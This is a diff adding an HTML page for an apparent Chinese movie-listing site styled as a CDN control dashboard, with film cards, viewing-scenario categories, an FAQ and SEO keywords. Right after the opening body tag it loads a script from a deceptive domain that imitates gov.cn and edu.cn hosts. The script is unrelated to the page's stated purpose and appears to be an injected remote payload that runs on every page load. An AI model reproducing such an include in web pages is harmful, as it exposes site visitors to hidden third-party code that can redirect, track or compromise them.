@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>不卡电影网 - bukadianyingwang-top 极速片单·低延迟高清秒开推荐</title>
+<meta name="description" content="不卡电影网（https://bukadianyingwang-top）以CDN调度中心为视觉，按秒开、低带宽、投屏、离线场景推荐高清电影。延迟条、节点ping、吞吐仪表UI，移动端自适应，必应收录友好，仅做影视信息展示。">
+<meta name="keywords" content="不卡电影网, bukadianyingwang-top, 极速片单, 低延迟电影, 高清秒开, CDN调度, 投屏电影, 必应收录">
+<meta name="author" content="不卡电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"PingFang SC","Microsoft YaHei","Consolas",monospace,sans-serif;color:#d7f5ee;line-height:1.75;overflow-x:hidden;background:#06121d;position:relative}
+body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.5;
+background:
+linear-gradient(180deg,#06121d,#0a1c2b 50%,#06121d),
+repeating-linear-gradient(90deg,rgba(54,224,200,.05) 0 1px,transparent 1px 38px),
+repeating-linear-gradient(0deg,rgba(54,224,200,.05) 0 1px,transparent 1px 38px)}
+a{color:#36e0c8;text-decoration:none;transition:.25s}
+a:hover{color:#7cffb2}
+.bk-nav{position:fixed;top:0;width:100%;z-index:1000;background:rgba(6,18,29,.92);backdrop-filter:blur(8px);border-bottom:1px solid rgba(54,224,200,.35)}
+.bk-in{max-width:1200px;margin:0 auto;height:66px;padding:0 1.5rem;display:flex;align-items:center;justify-content:space-between}
+.bk-logo{display:flex;align-items:center;gap:.7rem}
+.bk-ico{width:40px;height:40px;border-radius:8px;background:linear-gradient(135deg,#0c2a33,#103a3f);border:1px solid #36e0c8;display:flex;align-items:center;justify-content:center;font-size:1.1rem;color:#7cffb2;box-shadow:inset 0 0 8px rgba(54,224,200,.4)}
+.bk-name{font-size:1.02rem;font-weight:900;color:#eafffb;letter-spacing:.5px}
+.bk-name small{display:block;font-size:.5rem;letter-spacing:3px;color:#36e0c8;font-weight:700;font-family:"Consolas",monospace}
+.bk-links{display:flex;gap:.5rem;list-style:none}
+.bk-links a{font-size:.78rem;font-weight:700;color:#d7f5ee;padding:.36rem .8rem;border-radius:8px;border:1px solid rgba(54,224,200,.4);background:rgba(54,224,200,.08)}
+.bk-links a:hover{background:rgba(54,224,200,.2);color:#06121d;border-color:#7cffb2}
+.bk-toggle{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:6px}
+.bk-toggle span{width:22px;height:2.5px;background:#36e0c8;border-radius:2px}
+.bk-hero{margin-top:66px;padding:5rem 1.5rem 4.5rem;text-align:center;position:relative;z-index:1;overflow:hidden}
+.bk-ping{position:absolute;top:18px;right:18px;z-index:2;display:flex;gap:.3rem;align-items:flex-end;height:34px}
+.bk-ping i{width:6px;background:linear-gradient(180deg,#7cffb2,#36e0c8);border-radius:3px;animation:pk 1.1s ease-in-out infinite}
+.bk-ping i:nth-child(1){height:10px;animation-delay:0s}.bk-ping i:nth-child(2){height:18px;animation-delay:.15s}.bk-ping i:nth-child(3){height:26px;animation-delay:.3s}.bk-ping i:nth-child(4){height:14px;animation-delay:.45s}.bk-ping i:nth-child(5){height:22px;animation-delay:.6s}
+@keyframes pk{0%,100%{transform:scaleY(.5)}50%{transform:scaleY(1)}}
+.bk-hero-in{max-width:760px;margin:0 auto;position:relative;z-index:1}
+.bk-badge{display:inline-flex;align-items:center;gap.4rem;padding:.35rem 1rem;border-radius:18px;background:rgba(54,224,200,.1);border:1px solid rgba(54,224,200,.45);color:#7cffb2;font-size:.72rem;font-weight:700;letter-spacing:1px;margin-bottom:1.4rem;font-family:"Consolas",monospace}
+.bk-badge::before{content:"◉ LIVE"}
+.bk-hero h1{font-size:2.7rem;font-weight:900;color:#eafffb;line-height:1.2;margin-bottom:1rem}
+.bk-hero h1 span{color:#36e0c8}
+.bk-hero p{font-size:.9rem;color:#bfe9e1;max-width:560px;margin:0 auto 1.5rem;font-weight:500}
+.bk-domain{display:inline-block;padding:.5rem 1.2rem;border-radius:8px;background:#0a1c2b;border:1px solid rgba(54,224,200,.45);color:#d7f5ee;font-family:"Consolas",monospace;font-weight:700;font-size:.78rem;margin-bottom:1.5rem}
+.bk-btn{display:inline-flex;align-items:center;gap.5rem;padding:.8rem 2.2rem;border-radius:24px;font-weight:800;font-size:.88rem;color:#06121d;background:linear-gradient(135deg,#7cffb2,#36e0c8);box-shadow:0 6px 18px rgba(54,224,200,.3);border:1px solid #eafffb}
+.bk-btn:hover{transform:translateY(-2px);color:#06121d;box-shadow:0 8px 24px rgba(54,224,200,.45)}
+.bk-sec{max-width:1200px;margin:0 auto;padding:4rem 1.5rem;position:relative;z-index:1}
+.bk-sec-head{text-align:center;margin-bottom:2.5rem}
+.bk-sec-head h2{font-size:1.5rem;font-weight:900;color:#eafffb;display:inline-block;padding:.3rem 1.2rem;border:1px solid rgba(54,224,200,.45);border-radius:10px;background:rgba(54,224,200,.08);font-family:"Consolas",monospace}
+.bk-sec-head h2::before{content:"▣ ";}
+.bk-sec-head p{font-size:.72rem;color:#36e0c8;font-weight:700;letter-spacing:2px;margin-top:.7rem;font-family:"Consolas",monospace}
+/* 极速片单 */
+.bk-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:1.4rem}
+.bk-card{background:linear-gradient(180deg,rgba(10,28,43,.95),rgba(6,18,29,.95));border:1px solid rgba(54,224,200,.35);border-radius:14px;overflow:hidden;transition:.25s;position:relative}
+.bk-card:hover{transform:translateY(-4px);border-color:#7cffb2;box-shadow:0 14px 30px rgba(6,30,40,.5)}
+.bk-node{position:absolute;top:10px;left:10px;z-index:2;padding:.22rem .6rem;border-radius:8px;background:rgba(6,18,29,.8);border:1px solid rgba(124,255,178,.5);font-size:.6rem;font-weight:700;color:#7cffb2;font-family:"Consolas",monospace}
+.bk-cover{height:166px;display:flex;align-items:flex-end;padding:.9rem;font-weight:800;font-size:.9rem;color:#eafffb;position:relative}
+.bk-cover::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 35%,rgba(6,18,29,.85))}
+.bk-cover b{position:relative;z-index:1}
+.s1{background:linear-gradient(135deg,#0f8f7e,#062b27)}.s2{background:linear-gradient(135deg,#2f7fae,#0a2233)}.s3{background:linear-gradient(135deg,#caa23a,#5b4310)}
+.s4{background:linear-gradient(135deg,#7a5fae,#281a3a)}.s5{background:linear-gradient(135deg,#3fae8f,#0c2b22)}.s6{background:linear-gradient(135deg,#ae5f6f,#3a1820)}
+.s7{background:linear-gradient(135deg,#5f8fae,#15293a)}.s8{background:linear-gradient(135deg,#5fae7a,#163a22)}
+.bk-card-body{padding:1rem}
+.bk-card-body h3{font-size:.88rem;font-weight:900;color:#eafffb;margin-bottom:.3rem}
+.bk-vibe{font-size:.6rem;color:#36e0c8;font-weight:700;margin-bottom:.35rem;font-family:"Consolas",monospace}
+.bk-tags{display:flex;flex-wrap:wrap;gap:.25rem;margin-bottom:.5rem}
+.bk-tags span{padding:.15rem .5rem;border-radius:8px;background:rgba(54,224,200,.1);border:1px solid rgba(54,224,200,.35);color:#bfe9e1;font-size:.58rem;font-weight:700}
+.bk-lat{height:6px;border-radius:6px;background:#0a1c2b;overflow:hidden;margin-bottom:.4rem;border:1px solid rgba(54,224,200,.25)}
+.bk-lat i{display:block;height:100%;background:linear-gradient(90deg,#7cffb2,#36e0c8)}
+.bk-meta{display:flex;justify-content:space-between;font-size:.62rem;color:#bfe9e1;font-family:"Consolas",monospace;font-weight:700}
+.bk-meta b{color:#7cffb2}
+/* 场景分类 */
+.bk-cats{max-width:1000px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.1rem}
+.bk-cat{display:flex;align-items:center;gap.9rem;padding:1rem;border:1px solid rgba(54,224,200,.35);background:linear-gradient(180deg,rgba(10,28,43,.95),rgba(6,18,29,.95));border-radius:12px;transition:.25s}
+.bk-cat:hover{border-color:#7cffb2;background:rgba(54,224,200,.12)}
+.bk-cat-ico{width:46px;height:46px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.3rem;flex-shrink:0;background:linear-gradient(135deg,#0c2a33,#103a3f);border:1px solid #36e0c8;color:#7cffb2}
+.bk-cat-info h3{font-size:.84rem;font-weight:800;color:#eafffb;margin-bottom:.1rem}
+.bk-cat-info p{font-size:.68rem;color:#36e0c8;font-weight:500;font-family:"Consolas",monospace}
+/* 调度手记 */
+.bk-notes{max-width:860px;margin:0 auto}
+.bk-note{display:flex;gap:1rem;margin-bottom:1.2rem;align-items:flex-start}
+.bk-note-ava{width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;background:linear-gradient(135deg,#0c2a33,#103a3f);border:1px solid #36e0c8;color:#7cffb2}
+.bk-note-box{padding:1rem 1.2rem;border:1px solid rgba(54,224,200,.35);background:linear-gradient(180deg,rgba(10,28,43,.95),rgba(6,18,29,.95));border-radius:12px;flex:1}
+.bk-note-box h3{font-size:.9rem;font-weight:800;color:#eafffb;margin-bottom:.3rem}
+.bk-note-box p{font-size:.82rem;color:#bfe9e1;line-height:1.7;font-weight:500}
+.bk-note-stars{color:#7cffb2;letter-spacing:1px;font-size:.78rem;margin-top:.3rem;font-weight:700;font-family:"Consolas",monospace}
+/* 关于 */
+.bk-about{max-width:760px;margin:0 auto;text-align:center;padding:2.4rem 2rem;border:1px dashed rgba(54,224,200,.5);background:linear-gradient(180deg,rgba(10,28,43,.95),rgba(6,18,29,.95));border-radius:16px;position:relative}
+.bk-about::before{content:"📡";position:absolute;top:-18px;left:50%;transform:translateX(-50%);background:#06121d;padding:0 10px;font-size:1.5rem}
+.bk-about p{color:#bfe9e1;margin-bottom:.8rem;font-size:.88rem;font-weight:500}
+.bk-about b{color:#7cffb2}
+.bk-dom2{display:inline-block;margin-top:.7rem;padding:.5rem 1.2rem;border:1px solid rgba(54,224,200,.45);background:#0a1c2b;color:#d7f5ee;font-family:"Consolas",monospace;font-weight:700;font-size:.78rem;border-radius:8px}
+/* FAQ */
+.bk-faq{max-width:800px;margin:0 auto}
+.bk-fi{background:linear-gradient(180deg,rgba(10,28,43,.95),rgba(6,18,29,.95));border:1px solid rgba(54,224,200,.35);border-radius:12px;margin-bottom:.6rem;overflow:hidden}
+.bk-fi summary{padding:1rem 1.2rem;cursor:pointer;font-weight:800;color:#eafffb;list-style:none;position:relative;padding-right:3rem;font-size:.86rem}
+.bk-fi summary::-webkit-details-marker{display:none}
+.bk-fi summary::after{content:"＋";position:absolute;right:1rem;top:50%;transform:translateY(-50%);color:#06121d;font-weight:900;font-size:.9rem;width:24px;height:24px;display:flex;align-items:center;justify-content:center;border-radius:6px;background:#7cffb2}
+.bk-fi[open] summary::after{content:"－";background:#36e0c8;color:#06121d}
+.bk-fi p{padding:0 1.2rem 1rem;color:#bfe9e1;font-size:.82rem;line-height:1.7;font-weight:500}
+.bk-foot{text-align:center;padding:2rem 1.5rem;border-top:1px solid rgba(54,224,200,.35);background:#0a1c2b;color:#bfe9e1;font-size:.72rem;position:relative;z-index:1}
+.bk-foot p{margin-bottom:.3rem}
+.bk-foot .bk-copy{color:#7cffb2;font-weight:700;margin-bottom:.5rem;font-size:.8rem;font-family:"Consolas",monospace}
+@media(max-width:768px){
+.bk-links{display:none;position:absolute;top:100%;left:0;width:100%;background:#06121d;flex-direction:column;padding:.5rem 0;border-bottom:1px solid rgba(54,224,200,.35)}
+.bk-links.show{display:flex}
+.bk-links a{padding:.8rem 1.5rem;margin:.2rem 1rem;text-align:center}
+.bk-toggle{display:flex}
+.bk-hero h1{font-size:1.8rem}
+.bk-hero{padding:3rem 1rem 3rem}
+.bk-sec{padding:2.5rem 1rem}
+.bk-sec-head h2{font-size:1.3rem}
+.bk-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:.9rem}
+.bk-cover{height:142px;font-size:.8rem}
+.bk-cats{grid-template-columns:1fr 1fr}
+.bk-note{flex-direction:column;gap:.6rem}
+.bk-ping{display:none}
+}
+@media(max-width:480px){.bk-hero h1{font-size:1.4rem}.bk-grid{grid-template-columns:1fr 1fr}.bk-cats{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<nav class="bk-nav">
+  <div class="bk-in">
+    <div class="bk-logo">
+      <div class="bk-ico">📡</div>
+      <div class="bk-name">不卡电影网<small>CDN SMOOTH · BUKA</small></div>
+    </div>
+    <ul class="bk-links" id="bkLinks">
+      <li><a href="#home">调度台</a></li>
+      <li><a href="#list">极速片单</a></li>
+      <li><a href="#cats">不卡场景</a></li>
+      <li><a href="#notes">调度手记</a></li>
+      <li><a href="#about">关于不卡</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="bk-toggle" onclick="tBk()"><span></span><span></span><span></span></div>
+  </div>
+</nav>
+
+<section class="bk-hero" id="home">
+  <div class="bk-ping"><i></i><i></i><i></i><i></i><i></i></div>
+  <div class="bk-hero-in">
+    <div class="bk-badge">◉ LIVE 节点正常 · 秒开优先</div>
+    <h1>不卡电影网<br><span>像切CDN</span> 一样挑低延迟片单</h1>
+    <p>不卡电影网（bukadianyingwang-top）把选片做成调度台：每部片标清缓冲预估、分辨率档位、投屏/低带宽场景，按"秒开/稳播/省流"分层。信号延迟条、节点 ping、网格底，移动端自适应，只做影视信息展示，不内置盗版源。</p>
+    <div class="bk-domain">https://bukadianyingwang-top</div><br>
+    <a href="#list" class="bk-btn">▣ 进入极速片单</a>
+  </div>
+</section>
+
+<section class="bk-sec" id="list">
+  <div class="bk-sec-head"><h2>极速片单</h2><p>STREAM LIST · 本期8路节点</p></div>
+  <div class="bk-grid">
+    <div class="bk-card"><div class="bk-node">NODE-A1·秒开</div><div class="bk-cover s1"><b>疯狂动物城</b></div><div class="bk-card-body"><div class="bk-vibe">PROFILE: 1080P·缓冲0.4s</div><h3>疯狂动物城</h3><div class="bk-tags"><span>动画</span><span>合家欢</span></div><div class="bk-lat"><i style="width:94%"></i></div><div class="bk-meta"><span>延迟 22ms</span><b>★ 9.2</b></div></div></div>
+    <div class="bk-card"><div class="bk-node">NODE-B2·稳播</div><div class="bk-cover s2"><b>盗梦空间</b></div><div class="bk-card-body"><div class="bk-vibe">PROFILE: 1080P·多层叙事</div><h3>盗梦空间</h3><div class="bk-tags"><span>科幻</span><span>烧脑</span></div><div class="bk-lat"><i style="width:90%"></i></div><div class="bk-meta"><span>延迟 28ms</span><b>★ 9.4</b></div></div></div>
+    <div class="bk-card"><div class="bk-node">NODE-C3·省流</div><div class="bk-cover s3"><b>忠犬八公</b></div><div class="bk-card-body"><div class="bk-vibe">PROFILE: 720P·低带宽友好</div><h3>忠犬八公的故事</h3><div class="bk-tags"><span>温情</span><span>家庭</span></div><div class="bk-lat"><i style="width:86%"></i></div><div class="bk-meta"><span>延迟 31ms</span><b>★ 9.4</b></div></div></div>
+    <div class="bk-card"><div class="bk-node">NODE-D4·投屏</div><div class="bk-cover s4"><b>星际穿越</b></div><div class="bk-card-body"><div class="bk-vibe">PROFILE: 4K·客厅大屏</div><h3>星际穿越</h3><div class="bk-tags"><span>科幻</span><span>IMAX</span></div><div class="bk-lat"><i style="width:88%"></i></div><div class="bk-meta"><span>延迟 26ms</span><b>★ 9.4</b></div></div></div>
+    <div class="bk-card"><div class="bk-node">NODE-E5·秒开</div><div class="bk-cover s5"><b>小森林</b></div><div class="bk-card-body"><div class="bk-vibe">PROFILE: 1080P·下饭不卡</div><h3>小森林</h3><div class="bk-tags"><span>治愈</span><span>美食</span></div><div class="bk-lat"><i style="width:92%"></i></div><div class="bk-meta"><span>延迟 23ms</span><b>★ 9.0</b></div></div></div>
+    <div class="bk-card"><div class="bk-node">NODE-F6·稳播</div><div class="bk-cover s6"><b>寄生虫</b></div><div class="bk-card-body"><div class="bk-vibe">PROFILE: 1080P·高码稳定</div><h3>寄生虫</h3><div class="bk-tags"><span>剧情</span><span>社会</span></div><div class="bk-lat"><i style="width:89%"></i></div><div class="bk-meta"><span>延迟 27ms</span><b>★ 8.7</b></div></div></div>
+    <div class="bk-card"><div class="bk-node">NODE-G7·省流</div><div class="bk-cover s7"><b>海街日记</b></div><div class="bk-card-body"><div class="bk-vibe">PROFILE: 720P·慢片不费量</div><h3>海街日记</h3><div class="bk-tags"><span>家庭</span><span>日常</span></div><div class="bk-lat"><i style="width:85%"></i></div><div class="bk-meta"><span>延迟 32ms</span><b>★ 8.8</b></div></div></div>
+    <div class="bk-card"><div class="bk-node">NODE-H8·秒开</div><div class="bk-cover s8"><b>机器人总动员</b></div><div class="bk-card-body"><div class="bk-vibe">PROFILE: 1080P·低延迟动画</div><h3>机器人总动员</h3><div class="bk-tags"><span>动画</span><span>科幻</span></div><div class="bk-lat"><i style="width:93%"></i></div><div class="bk-meta"><span>延迟 21ms</span><b>★ 9.3</b></div></div></div>
+  </div>
+</section>
+
+<section class="bk-sec" id="cats" style="background:rgba(10,28,43,.6);border-top:1px solid rgba(54,224,200,.35);border-bottom:1px solid rgba(54,224,200,.35)">
+  <div class="bk-sec-head"><h2>不卡场景</h2><p>PLAY SCENARIOS · 按网络环境选片</p></div>
+  <div class="bk-cats">
+    <div class="bk-cat"><div class="bk-cat-ico">⚡</div><div class="bk-cat-info"><h3>秒开·高清</h3><p>18部 · 1080P/低缓冲</p></div></div>
+    <div class="bk-cat"><div class="bk-cat-ico">📶</div><div class="bk-cat-info"><h3>低带宽·省流</h3><p>16部 · 720P/移动网络</p></div></div>
+    <div class="bk-cat"><div class="bk-cat-ico">📺</div><div class="bk-cat-info"><h3>投屏·大屏</h3><p>12部 · 4K/客厅院线感</p></div></div>
+    <div class="bk-cat"><div class="bk-cat-ico">💾</div><div class="bk-cat-info"><h3>离线·缓存</h3><p>10部 · 通勤提前下</p></div></div>
+    <div class="bk-cat"><div class="bk-cat-ico">🧘</div><div class="bk-cat-info"><h3>稳播·长片</h3><p>14部 · 不中断/不转圈</p></div></div>
+    <div class="bk-cat"><div class="bk-cat-ico">🎬</div><div class="bk-cat-info"><h3>合集·连映</h3><p>10部 · 周末不卡专场</p></div></div>
+    <div class="bk-cat"><div class="bk-cat-ico">📊</div><div class="bk-cat-info"><h3>码率·测试</h3><p>8部 · 高码/色彩样片</p></div></div>
+    <div class="bk-cat"><div class="bk-cat-ico">🛰</div><div class="bk-cat-info"><h3>节点·优选</h3><p>全站 · 按延迟排序</p></div></div>
+  </div>
+</section>
+
+<section class="bk-sec" id="notes">
+  <div class="bk-sec-head"><h2>调度手记</h2><p>OPS NOTES · 播放体验观测</p></div>
+  <div class="bk-notes">
+    <div class="bk-note">
+      <div class="bk-note-ava">⚡</div>
+      <div class="bk-note-box">
+        <h3>《机器人总动员》—— 秒开样片</h3>
+        <p>前40分钟对白极少、画面信息密度高，适合测低延迟与色彩。1080P 下首帧快、转场少卡顿；移动端开"省电+高清"也能稳播，列秒开区默认样片。</p>
+        <div class="bk-note-stars">SCORE 9.3 · LAT 21ms</div>
+      </div>
+    </div>
+    <div class="bk-note">
+      <div class="bk-note-ava">📶</div>
+      <div class="bk-note-box">
+        <h3>《忠犬八公》—— 低带宽友好</h3>
+        <p>剧情靠表演不靠特效，720P 在4G/弱网也清晰。单集码率不高、缓存体积小，通勤离线与省流场景都稳，情绪片却不吃流量，列省流区。</p>
+        <div class="bk-note-stars">SCORE 9.4 · LAT 31ms</div>
+      </div>
+    </div>
+    <div class="bk-note">
+      <div class="bk-note-ava">📺</div>
+      <div class="bk-note-box">
+        <h3>《星际穿越》—— 投屏大屏</h3>
+        <p>黑洞、玉米地、五维书房都吃分辨率；4K 投屏才有星场层次。建议家庭Wi‑Fi 5G频段+首帧预加载，避免开局字幕段转圈，列大屏节点优选。</p>
+        <div class="bk-note-stars">SCORE 9.4 · LAT 26ms</div>
+      </div>
+    </div>
+    <div class="bk-note">
+      <div class="bk-note-ava">🧘</div>
+      <div class="bk-note-box">
+        <h3>《小森林》—— 稳播下饭</h3>
+        <p>无大场面、无快速剪辑，长镜头多；稳播优先级高于极致码率。手机热点也能连续播四季不中断，列"稳播+下饭"双标签，适合边吃边看。</p>
+        <div class="bk-note-stars">SCORE 9.0 · LAT 23ms</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="bk-sec" id="about">
+  <div class="bk-sec-head"><h2>关于不卡电影网</h2><p>ABOUT · 为什么用调度台</p></div>
+  <div class="bk-about">
+    <p><b>不卡电影网</b>（bukadianyingwang-top）不承诺"永远零缓冲"（那取决于你本地网络），只把选片按播放体验分层：秒开、省流、投屏、离线、稳播。每部片给分辨率档位与延迟预估，像CDN控制台一样挑今晚不转圈的片。</p>
+    <p>全站单页、锚点导航、移动端自适应；必应验证用 head 内 msvalidate.01，按约定不生成 robots.txt 与 sitemap.xml。所有片单仅做信息展示，版权归制片方/发行方所有，不提供未授权播放源。</p>
+    <div class="bk-dom2">https://bukadianyingwang-top</div>
+    <p style="margin-top:1rem;font-size:.74rem;color:#36e0c8;font-weight:700;font-family:"Consolas",monospace">核心词：不卡电影网、bukadianyingwang-top、极速片单、低延迟、高清秒开、CDN调度</p>
+  </div>
+</section>
+
+<section class="bk-sec" id="faq" style="background:rgba(10,28,43,.6);border-top:1px solid rgba(54,224,200,.35)">
+  <div class="bk-sec-head"><h2>常见问题</h2><p>FAQ · 调度问答</p></div>
+  <div class="bk-faq">
+    <details class="bk-fi"><summary>不卡电影网是什么？</summary><p>不卡电影网（bukadianyingwang-top）是以"CDN调度中心"为视觉的电影信息站，按秒开、省流、投屏、离线、稳播场景推荐高分片。仅做信息展示，不提供盗版播放源，实际流畅度以你本地网络为准。</p></details>
+    <details class="bk-fi"><summary>卡片上的"延迟/缓冲"是实测吗？</summary><p>示例中延迟与缓冲为演示性预估，用于表达选片场景（如秒开/省流/大屏），不是对你网络的实时探测。真要测速请用本地播放器或视频平台诊断页。</p></details>
+    <details class="bk-fi"><summary>官方网址是？</summary><p>https://bukadianyingwang-top（用 GitHub Pages 可改为 https://bukadianyingwang-top.github.io，全站统一替换域名即可）。</p></details>
+    <details class="bk-fi"><summary>手机上信号条/ping会卡吗？</summary><p>全站响应式，小屏导航折叠为汉堡菜单；信号条用纯CSS高度动画、ping用几条scaleY，数量很少；低端机可删 .bk-ping 与 .bk-lat 动画改静态色块。</p></details>
+    <details class="bk-fi"><summary>必应收录怎么配？</summary><p>到 Bing Webmaster Tools 添加站点，选HTML meta验证，把 head 里 msvalidate.01 的 YOUR_BING_VERIFICATION_CODE 换成你的验证码；单页按约定不提交sitemap，可在站长工具手动提交首页URL加快发现。</p></details>
+  </div>
+</section>
+
+<footer class="bk-foot">
+  <p class="bk-copy">▣ 不卡电影网 (bukadianyingwang-top) — 极速片单·低延迟选片</p>
+  <p>单页网站 / 锚点导航 / 移动端自适应 / 必应收录友好 / 不生成 robots.txt 与 sitemap.xml</p>
+  <p style="margin-top:.4rem;color:#7cffb2;font-weight:600">本站仅提供影视信息展示，资源版权归原作者及发行方所有；实际播放流畅度取决于本地网络与正版平台。</p>
+</footer>
+
+<script>
+function tBk(){document.getElementById('bkLinks').classList.toggle('show')}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var h=this.getAttribute('href');
+    if(h.length>1){var t=document.querySelector(h);if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});document.getElementById('bkLinks').classList.remove('show')}}
+  })
+});
+</script>
+</body>
+</html>
